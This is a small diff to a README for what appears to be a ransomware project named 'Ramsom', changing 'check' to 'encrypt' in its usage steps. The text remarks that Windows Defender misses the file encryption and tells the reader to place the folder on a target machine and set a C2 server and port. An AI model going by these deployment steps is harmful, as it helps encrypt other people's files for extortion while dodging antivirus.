@@ -100,7 +100,7 @@ Defender ?
 Defender is probably being fooled by the build, but I'm disappointed that it doesn't even detect file encryption on your PC.
 
 - After you've built or downloaded the release, you end up with a `Ramsom` folder.
-- Place it anywhere on the machine you want to “check”.
+- Place it anywhere on the machine you want to “encrypt”.
 
 - Run cmd to specify the C2 server and port. Type `cmd` at the top of the address bar.
   ![plot](./img/cmdexec.png)
